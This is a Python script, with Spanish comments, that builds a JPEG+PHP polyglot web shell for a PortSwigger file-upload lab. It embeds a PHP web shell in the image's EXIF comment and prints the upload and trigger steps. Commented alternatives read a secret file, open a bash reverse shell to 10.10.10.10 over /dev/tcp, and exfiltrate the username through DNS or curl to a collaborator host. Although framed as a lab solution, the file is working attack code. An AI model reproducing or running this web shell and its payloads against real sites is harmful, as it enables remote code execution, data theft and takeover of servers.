#!/usr/bin/env python3
"""Genera un polyglot JPEG+PHP (web shell) con exiftool. Lab PortSwigger:
"RCE via polyglot web shell upload". Uso: python build_polyglot.py [imagen.jpg]"""
import base64, os, shutil, subprocess, sys

# --- PAYLOAD: cambia solo esta linea -----------------------------------------
PAYLOAD = '<?php echo system($_GET["cmd"]); ?>'                 # (A) web shell ?cmd=
# PAYLOAD = '<?php echo file_get_contents("/home/carlos/secret"); ?>'  # (B) secreto
# PAYLOAD = "<?php exec(\"bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'\"); ?>"  # (C) reverse
# PAYLOAD = '<?php system("nslookup $(whoami).YOUR-ID.oastify.com"); ?>'  # (D) OAST/DNS (Collaborator): confirma RCE ciego y exfiltra whoami en el subdominio (alt: curl http://YOUR-ID.oastify.com)

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "exploit.php")            # polyglot de salida
BASE_IMG = sys.argv[1] if len(sys.argv) > 1 else os.path.join(HERE, "base.jpg")
EXIFTOOL = os.path.join(HERE, "exiftool.exe")
if not os.path.isfile(EXIFTOOL):
    EXIFTOOL = shutil.which("exiftool")

# JPEG 1x1 valido de reserva si no pasas una imagen base.
_B64 = ("/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRof"
    "Hh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwh"
    "MjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAAR"
    "CAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAA"
    "AgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkK"
    "FhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWG"
    "h4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl"
    "5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREA"
    "AgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYk"
    "NOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOE"
    "hYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk"
    "5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD3+iiigD//2Q==")

if not EXIFTOOL:
    sys.exit("[!] falta exiftool.exe en esta carpeta (o exiftool en el PATH)")
if not os.path.isfile(BASE_IMG):
    with open(BASE_IMG, "wb") as f:
        f.write(base64.b64decode(_B64))

shutil.copyfile(BASE_IMG, OUT)
subprocess.run([EXIFTOOL, "-overwrite_original", f"-Comment={PAYLOAD}", OUT],
               check=True, capture_output=True, text=True)

print(f"[+] creado: {OUT}")
print(f"[+] payload: {PAYLOAD}")
print(f"[+] subelo como .php al avatar y luego:  GET /files/avatars/exploit.php?cmd=id")
